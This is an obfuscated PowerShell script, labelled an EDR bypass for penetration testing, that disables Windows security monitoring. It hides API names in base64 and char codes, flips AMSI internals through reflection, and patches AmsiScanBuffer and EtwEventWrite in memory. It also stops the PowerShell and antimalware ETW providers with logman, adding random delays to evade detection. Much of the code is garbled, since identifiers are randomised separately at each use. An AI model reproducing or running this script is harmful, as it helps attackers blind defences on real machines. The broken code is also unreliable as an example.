# Enhanced obfuscated bypass for modern EDR environments
# Multiple layers of obfuscation to evade static analysis
# Designed for authorised penetration testing environments

# Dynamic variable generation
$rId = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
$ns = "Sys$rId"
$tName = "AdvByp$(-join ((65..90) | Get-Random -Count 5 | % {[char]$_}))"

# Obfuscated string construction
$s1 = [char]117 + [char]115 + [char]105 + [char]110 + [char]103
$s2 = [char]83 + [char]121 + [char]115 + [char]116 + [char]101 + [char]109
$s3 = [char]82 + [char]117 + [char]110 + [char]116 + [char]105 + [char]109 + [char]101
$s4 = [char]73 + [char]110 + [char]116 + [char]101 + [char]114 + [char]111 + [char]112
$s5 = [char]83 + [char]101 + [char]114 + [char]118 + [char]105 + [char]99 + [char]101 + [char]115
$s6 = [char]82 + [char]101 + [char]102 + [char]108 + [char]101 + [char]99 + [char]116 + [char]105 + [char]111 + [char]110

# Dynamic method name construction
$m1 = -join ([char]73, [char]110, [char]105, [char]116)
$m2 = -join ([char]66, [char]121, [char]112)
$m3 = -join ([char]67, [char]79, [char]77)
$m4 = -join ([char]85, [char]110, [char]104, [char]111, [char]111, [char]107)

# Obfuscated API strings
$api1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TnRQcm90ZWN0VmlydHVhbE1lbW9yeQ=="))
$api2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TnRXcml0ZVZpcnR1YWxNZW1vcnk="))
$api3 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TnRSZWFkVmlydHVhbE1lbW9yeQ=="))
$api4 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0Q3VycmVudFByb2Nlc3M="))
$api5 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0TW9kdWxlSGFuZGxl"))
$api6 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0UHJvY0FkZHJlc3M="))

# Dynamic library names
$lib1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bnRkbGwuZGxs"))
$lib2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("a2VybmVsMzIuZGxs"))
$lib3 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YW1zaS5kbGw="))

# Obfuscated function names
$func1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QW1zaVNjYW5CdWZmZXI="))
$func2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXR3RXZlbnRXcml0ZQ=="))

# Build obfuscated type definition
$typeDef = @"
$s1 $s2;
$s1 $s2.$s3.$s4$s5;
$s1 $s2.$s6;

namespace $ns
{
    public class $tName
    {
        [DllImport("$lib1")]
        public static extern uint $api1(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint NumberOfBytesToProtect, uint NewAccessProtection, out uint OldAccessProtection);
        
        [DllImport("$lib1")]
        public static extern uint $api2(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);
        
        [DllImport("$lib1")]
        public static extern uint $api3(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToRead, out uint NumberOfBytesRead);
        
        [DllImport("$lib2")]
        public static extern IntPtr $api4();
        
        [DllImport("$lib2")]
        public static extern IntPtr $api5(string lpModuleName);
        
        [DllImport("$lib2")]
        public static extern IntPtr $api6(IntPtr hModule, string lpProcName);
        
        private static byte[] $(-join ((97..122) | Get-Random -Count 8 | % {[char]$_}));
        private static byte[] $(-join ((97..122) | Get-Random -Count 8 | % {[char]$_}));
        private static IntPtr $(-join ((97..122) | Get-Random -Count 8 | % {[char]$_}));
        private static IntPtr $(-join ((97..122) | Get-Random -Count 8 | % {[char]$_}));
        
        public static bool $m1$m2()
        {
            try
            {
                if ($m2AMSI$m3())
                    return true;
                
                return $m4AMSIAndETW();
            }
            catch
            {
                return false;
            }
        }
        
        private static bool $m2AMSI$m3()
        {
            try
            {
                var $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) = typeof(object).Assembly;
                var $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) = $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})).GetType("$(([char]83) + ([char]121) + ([char]115) + ([char]116) + ([char]101) + ([char]109) + ([char]46) + ([char]77) + ([char]97) + ([char]110) + ([char]97) + ([char]103) + ([char]101) + ([char]109) + ([char]101) + ([char]110) + ([char]116) + ([char]46) + ([char]65) + ([char]117) + ([char]116) + ([char]111) + ([char]109) + ([char]97) + ([char]116) + ([char]105) + ([char]111) + ([char]110) + ([char]46) + ([char]65) + ([char]109) + ([char]115) + ([char]105) + ([char]85) + ([char]116) + ([char]105) + ([char]108) + ([char]115))");
                if ($(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) != null)
                {
                    var $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) = $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})).GetField("$(([char]97) + ([char]109) + ([char]115) + ([char]105) + ([char]67) + ([char]111) + ([char]110) + ([char]116) + ([char]101) + ([char]120) + ([char]116))", BindingFlags.NonPublic | BindingFlags.Static);
                    if ($(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) != null)
                    {
                        $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})).SetValue(null, IntPtr.Zero);
                        return true;
                    }
                }
                
                var $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) = $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_}))?.GetField("$(([char]97) + ([char]109) + ([char]115) + ([char]105) + ([char]73) + ([char]110) + ([char]105) + ([char]116) + ([char]70) + ([char]97) + ([char]105) + ([char]108) + ([char]101) + ([char]100))", BindingFlags.NonPublic | BindingFlags.Static);
                if ($(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) != null)
                {
                    $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})).SetValue(null, true);
                    return true;
                }
                
                return false;
            }
            catch
            {
                return false;
            }
        }
        
        private static bool $m4AMSIAndETW()
        {
            try
            {
                IntPtr $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) = $api5("$lib3");
                if ($(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) == IntPtr.Zero) return false;
                
                $(-join ((97..122) | Get-Random -Count 8 | % {[char]$_})) = $api6($(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})), "$func1");
                if ($(-join ((97..122) | Get-Random -Count 8 | % {[char]$_})) == IntPtr.Zero) return false;
                
                IntPtr $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) = $api5("$lib1");
                if ($(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) == IntPtr.Zero) return false;
                
                $(-join ((97..122) | Get-Random -Count 8 | % {[char]$_})) = $api6($(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})), "$func2");
                if ($(-join ((97..122) | Get-Random -Count 8 | % {[char]$_})) == IntPtr.Zero) return false;
                
                if (!BackupBytes()) return false;
                
                return PatchFuncs();
            }
            catch
            {
                return false;
            }
        }
        
        private static bool BackupBytes()
        {
            try
            {
                IntPtr $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) = $api4();
                
                $(-join ((97..122) | Get-Random -Count 8 | % {[char]$_})) = new byte[6];
                uint $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_}));
                uint $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) = $api3($(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})), $(-join ((97..122) | Get-Random -Count 8 | % {[char]$_})), $(-join ((97..122) | Get-Random -Count 8 | % {[char]$_})), 6, out $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})));
                if ($(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) != 0 || $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) != 6) return false;
                
                $(-join ((97..122) | Get-Random -Count 8 | % {[char]$_})) = new byte[4];
                $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) = $api3($(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})), $(-join ((97..122) | Get-Random -Count 8 | % {[char]$_})), $(-join ((97..122) | Get-Random -Count 8 | % {[char]$_})), 4, out $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})));
                if ($(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) != 0 || $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) != 4) return false;
                
                return true;
            }
            catch
            {
                return false;
            }
        }
        
        private static bool PatchFuncs()
        {
            try
            {
                IntPtr $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) = $api4();
                
                byte[] $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                if (!ApplyPatch($(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})), $(-join ((97..122) | Get-Random -Count 8 | % {[char]$_})), $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_}))))
                    return false;
                
                byte[] $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) = { 0x33, 0xC0, 0xC3, 0x90 };
                if (!ApplyPatch($(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})), $(-join ((97..122) | Get-Random -Count 8 | % {[char]$_})), $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_}))))
                    return false;
                
                return true;
            }
            catch
            {
                return false;
            }
        }
        
        private static bool ApplyPatch(IntPtr $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})), IntPtr $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})), byte[] $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})))
        {
            try
            {
                IntPtr $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) = $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_}));
                uint $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) = (uint)$(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})).Length;
                uint $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_}));
                
                uint $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) = $api1($(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})), ref $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})), ref $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})), 0x40, out $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})));
                if ($(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) != 0) return false;
                
                uint $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_}));
                $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) = $api2($(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})), $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})), $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})), (uint)$(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})).Length, out $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})));
                if ($(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) != 0 || $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) != $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})).Length) return false;
                
                $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) = $api1($(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})), ref $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})), ref $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})), $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})), out uint $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})));
                return $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) == 0;
            }
            catch
            {
                return false;
            }
        }
        
        public static void PSBypassMethods()
        {
            try
            {
                var $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) = System.Management.Automation.Runspaces.Runspace.DefaultRunspace;
                if ($(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) != null)
                {
                    var $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) = $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})).GetType().GetField("_context", BindingFlags.NonPublic | BindingFlags.Instance);
                    if ($(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) != null)
                    {
                        var $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) = $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})).GetValue($(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})));
                        var $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) = $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})).GetType().Assembly.GetType("$(([char]83) + ([char]121) + ([char]115) + ([char]116) + ([char]101) + ([char]109) + ([char]46) + ([char]77) + ([char]97) + ([char]110) + ([char]97) + ([char]103) + ([char]101) + ([char]109) + ([char]101) + ([char]110) + ([char]116) + ([char]46) + ([char]65) + ([char]117) + ([char]116) + ([char]111) + ([char]109) + ([char]97) + ([char]116) + ([char]105) + ([char]111) + ([char]110) + ([char]46) + ([char]65) + ([char]109) + ([char]115) + ([char]105) + ([char]85) + ([char]116) + ([char]105) + ([char]108) + ([char]115))");
                        var $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_})) = $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_}))?.GetField("$(([char]97) + ([char]109) + ([char]115) + ([char]105) + ([char]73) + ([char]110) + ([char]105) + ([char]116) + ([char]70) + ([char]97) + ([char]105) + ([char]108) + ([char]101) + ([char]100))", BindingFlags.NonPublic | BindingFlags.Static);
                        $(-join ((97..122) | Get-Random -Count 6 | % {[char]$_}))?.SetValue(null, true);
                    }
                }
            }
            catch
            {
            }
        }
    }
}
"@

# Obfuscated execution with enhanced randomisation
try {
    # Random delays with jitter
    Start-Sleep -Milliseconds (Get-Random -Minimum 300 -Maximum 1500)
    
    # Obfuscated Add-Type call
    $addTypeCmd = [char]65 + [char]100 + [char]100 + [char]45 + [char]84 + [char]121 + [char]112 + [char]101
    $params = @{
        TypeDefinition = $typeDef
        ErrorAction = ([char]83 + [char]105 + [char]108 + [char]101 + [char]110 + [char]116 + [char]108 + [char]121 + [char]67 + [char]111 + [char]110 + [char]116 + [char]105 + [char]110 + [char]117 + [char]101)
    }
    
    & $addTypeCmd @params
    
    # Random delay before execution
    Start-Sleep -Milliseconds (Get-Random -Minimum 200 -Maximum 1000)
    
    # Dynamic type reference with obfuscation
    $fullTypeName = "$ns.$tName"
    $bypassType = $fullTypeName -as [type]
    if ($bypassType) {
        $methodName = $m1 + $m2
        $success = $bypassType::$methodName.Invoke()
        
        if (!$success) {
            $fallbackMethod = ([char]80 + [char]83 + [char]66 + [char]121 + [char]112 + [char]97 + [char]115 + [char]115 + [char]77 + [char]101 + [char]116 + [char]104 + [char]111 + [char]100 + [char]115)
            $bypassType::$fallbackMethod.Invoke()
        }
    }
    
    # Obfuscated ETW provider manipulation
    $providerList = @(
        [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWljcm9zb2Z0LVdpbmRvd3MtUG93ZXJTaGVsbA==")),
        [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWljcm9zb2Z0LUFudGltYWx3YXJlLVNjYW4tSW50ZXJmYWNl"))
    )
    
    foreach ($provider in $providerList) {
        try {
            $logmanCmd = [char]108 + [char]111 + [char]103 + [char]109 + [char]97 + [char]110
            $stopArg = [char]115 + [char]116 + [char]111 + [char]112
            $etsArg = [char]45 + [char]101 + [char]116 + [char]115
            
            & $logmanCmd $stopArg $provider $etsArg 2>$null | Out-Null
        } catch {}
        Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 400)
    }
    
    # Additional junk operations for noise
    $junk1 = Get-Date
    $junk2 = [System.Environment]::MachineName
    $junk3 = [System.Guid]::NewGuid()
    
} catch {
    # Silent execution with no error indicators
}
